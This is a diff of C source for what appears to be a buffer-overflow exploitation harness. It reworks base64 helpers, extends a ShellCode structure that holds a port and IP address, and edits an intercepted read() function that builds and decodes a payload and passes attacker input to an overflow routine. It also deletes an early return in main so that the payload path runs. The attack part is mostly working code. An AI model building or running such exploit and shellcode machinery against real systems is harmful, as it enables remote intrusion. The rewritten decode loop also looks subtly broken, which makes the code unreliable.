@@ -1,4 +1,6 @@
 #define _GNU_SOURCE
+#include <arpa/inet.h>
+#include <netdb.h>
 #include <assert.h>
 #include <dlfcn.h>
 #include <stddef.h>
@@ -6,43 +8,37 @@
 #include <string.h>
 #include <unistd.h>
 
-#include <arpa/inet.h>
-#include <netdb.h> // gethostbyname()
-
-static char encodingTable[] = {
+static const unsigned char tEncode64[64] = {
 	'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P',
 	'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z', 'a', 'b', 'c', 'd', 'e', 'f',
 	'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v',
-	'w', 'x', 'y', 'z', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9', '+', '/'};
-static int mod_table[] = {0, 2, 1};
+	'w', 'x', 'y', 'z', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9', '+', '/'
+};
 
-char *base64Encode(const unsigned char *data, size_t inputLength, size_t *outputLength) {
-	static char encodedData[10000];
+static size_t encode64(const unsigned char *s256, const size_t n256, unsigned char *s64, size_t m64) {
 
-	*outputLength = 4 * ((inputLength + 2) / 3);
+	// Calculate encoded size but limit to size of our output buffer
+	size_t n64 = 4 * ((n256 + 2) / 3);
+	if (n64 > m64)
+		n64 = m64;
 
-	assert(*outputLength < sizeof(encodedData));
+	// Loop over input data generating four 6-in-8 bytes for each three 8-in-8 bytes
+	for (size_t i256 = 0, i64 = 0, triple = 0; i256 < n256 && i64 < n64;) {
+		for (size_t i = 0; i < 3; i++)
+			triple = (triple << 8) + ((i256 < n256 ) ? s256[i256++] : 0);
 
-	for (int i = 0, j = 0; i < inputLength;) {
-		uint32_t octet_a = i < inputLength ? (unsigned char)data[i++] : 0;
-		uint32_t octet_b = i < inputLength ? (unsigned char)data[i++] : 0;
-		uint32_t octet_c = i < inputLength ? (unsigned char)data[i++] : 0;
-
-		uint32_t triple = (octet_a << 0x10) + (octet_b << 0x08) + octet_c;
-
-		encodedData[j++] = encodingTable[(triple >> 3 * 6) & 0x3F];
-		encodedData[j++] = encodingTable[(triple >> 2 * 6) & 0x3F];
-		encodedData[j++] = encodingTable[(triple >> 1 * 6) & 0x3F];
-		encodedData[j++] = encodingTable[(triple >> 0 * 6) & 0x3F];
+		for (size_t i = 0; i < 4; i++)
+			s64[i64++] = tEncode64[(triple >> ((3 - i) * 6)) & (1 << 6) - 1];
 	} // for
 
-	for (int i = 0; i < mod_table[inputLength % 3]; i++)
-		encodedData[*outputLength - 1 - i] = '=';
+	// Back-patch trailing overrun created by the "chunky" encoder (above).
+	for (size_t i = 0; i < (n256 * 2) % 3; i++)
+		s64[n64 - 1 - i] = '=';
 
-	return encodedData;
-}
+	return n64;
+} // encode64()
 
-static const unsigned char pr2six[256] = {
+static const unsigned char tDecode64[256] = {
 	64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64,
 	64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64,
 	64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 62, 64, 64, 64, 63,
@@ -61,45 +57,31 @@ static const unsigned char pr2six[256] = {
 	64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64
 };
 
-static int base64Decode(char *bufplain, const char *bufcoded)
-{
-	int nBytesDecoded;
-	register const unsigned char *bufin;
-	register unsigned char *bufout;
-	register int nprbytes;
+static size_t length64(const unsigned char *s64) {
+	for (size_t i = 0; ; i++)
+		if (tDecode64[s64[i]] >  63)
+			return i;
+} // length64()
 
-	bufin = (const unsigned char *) bufcoded;
-	while (pr2six[*(bufin++)] <= 63);
-	nprbytes = (bufin - (const unsigned char *) bufcoded) - 1;
-	nBytesDecoded = ((nprbytes + 3) / 4) * 3;
+static size_t decode64(const unsigned char *s64, const size_t n64, unsigned char *s256, const size_t m256) {
 
-	bufout = (unsigned char *) bufplain;
-	bufin = (const unsigned char *) bufcoded;
+	// Calculate decoded size but limit to size of our output buffer
+	size_t n256 = (((n64 + 3) / 4) * 3) - ((4 - n64) & 3);
 
-	while (nprbytes > 4) {
-		*(bufout++) = (unsigned char) (pr2six[bufin[0]] << 2 | pr2six[bufin[1]] >> 4);
-		*(bufout++) = (unsigned char) (pr2six[bufin[1]] << 4 | pr2six[bufin[2]] >> 2);
-		*(bufout++) = (unsigned char) (pr2six[bufin[2]] << 6 | pr2six[bufin[3]]);
-		bufin += 4;
-		nprbytes -= 4;
-	}
+	if (n256 > m256 - 1)
+		n256 = m256 - 1;
 
-	/* Note: (nprbytes == 1) would be an error, so just ingore that case */
-	if (nprbytes > 1) {
-		*(bufout++) = (unsigned char) (pr2six[*bufin] << 2 | pr2six[bufin[1]] >> 4);
-	}
-	if (nprbytes > 2) {
-		*(bufout++) = (unsigned char) (pr2six[bufin[1]] << 4 | pr2six[bufin[2]] >> 2);
-	}
-	if (nprbytes > 3) {
-		*(bufout++) = (unsigned char) (pr2six[bufin[2]] << 6 | pr2six[bufin[3]]);
-	}
+	// Loop over input data generating three 8-in-8 bytes for each four 6-in-8 bytes
+	for (size_t i64 = 0, i256 = 0, triple = 0; i64 < n64 && i256 < n256; i64++) {
+		if (i64 < n64 - 1) { s256[i256++] = (tDecode64[s64[i64]] << 2 | tDecode64[s64[i64 + 1]] >> 4); i64++; }
+		if (i64 < n64 - 1) { s256[i256++] = (tDecode64[s64[i64]] << 4 | tDecode64[s64[i64 + 1]] >> 2); i64++; }
+		if (i64 < n64 - 1) { s256[i256++] = (tDecode64[s64[i64]] << 6 | tDecode64[s64[i64 + 1]] >> 0); i64++; }
+	} // for
 
-	*(bufout++) = '\0';
-	nBytesDecoded -= (4 - nprbytes) & 3;
+	s256[n256] = '\0';
 
-	return nBytesDecoded;
-}
+	return n256;
+} // decode64()
 
 typedef void *Pointer;
 
@@ -122,10 +104,11 @@ typedef struct ShellCode {
 	unsigned short	port;
 	IPAddress	ipAddress;
 	unsigned char	epilog[50];
+	unsigned short	unused;
 } ShellCode, *ShellCodePtr;
 
 typedef union ShellCodeUnion {
-	unsigned char	raw[74];
+	unsigned char	raw[76];
 	ShellCode	sc; 
 } ShellCodeUnion, *ShellCodeUnionPtr;
 
@@ -441,16 +424,16 @@ ssize_t read(int fd, void *buf, size_t count) {
 			} // if
 
 dumpload(&payload);
-			size_t payload64Size;
-			char *payload64 = base64Encode((const unsigned char *) &payload, sizeof(payload), &payload64Size);
-			char *src = p + nc;
-			char *dst = p - strlen(s_magic) - strlen(s_makeload) + payload64Size;
-			int need = strlen(s_magic) - strlen(s_makeload) - nc + payload64Size;
-			int tail = result - (src - ((char *) buf));
-			memmove(dst, src, tail);
-			memcpy(((char *) p) - strlen(s_magic) - strlen(s_makeload), payload64, payload64Size);
-			result += need;
-			((char *) buf)[result] = 0;
+                        unsigned char payload64[4096];
+                        size_t nPayload64 = encode64((const unsigned char *) &payload, sizeof(payload), payload64, sizeof(payload64));
+                        char *src = p + nc;
+                        char *dst = p - strlen(s_magic) - strlen(s_makeload) + nPayload64;
+                        int need = strlen(s_magic) - strlen(s_makeload) - nc + nPayload64;
+                        int tail = result - (src - ((char *) buf));
+                        memmove(dst, src, tail);
+                        memcpy(((char *) p) - strlen(s_magic) - strlen(s_makeload), payload64, nPayload64);
+                        result += need;
+                        ((char *) buf)[result] = 0;
 		} // if
 		else if (!strncmp(s_dumpload, p, strlen(s_dumpload)))
 			dumpload(&payload);
@@ -459,9 +442,9 @@ dumpload(&payload);
 			overflow((Pointer)&payload, sizeof(payload));
 		}
 		else if (!strncmp(s_overflow, p, strlen(s_overflow))) {
-			base64Decode(p, p + strlen(s_overflow));
-			overflow(p, sizeof(Payload));
-
+			unsigned char *s64 = (unsigned char *) (p + strlen(s_overflow));
+                        size_t n256 = decode64(s64, length64(s64), (unsigned char *) p, 65535);
+                        overflow(p, n256);
 		} // else if
 	} // if
 
@@ -479,12 +462,11 @@ int main(int argc, char **argv)
 	assert(sizeof(ptrdiff_t) == 8);
 	assert(sizeof(Offset) == 8);
 	assert(sizeof(AddressUnion) == 8);
-	assert(sizeof(ShellCodeUnion) == 74);
-	assert(sizeof(unsigned short) == 2);
+	assert(sizeof(IPAddress) == 4);
+	assert(sizeof(ShellCodeUnion) == 76);
 	assert(getpagesize() == 4096);
 	assert((-1^(getpagesize()-1))==0xfffffffffffff000);
 
-return -1;
         initialize();
         makeload(&payload);
         dumpload(&payload);
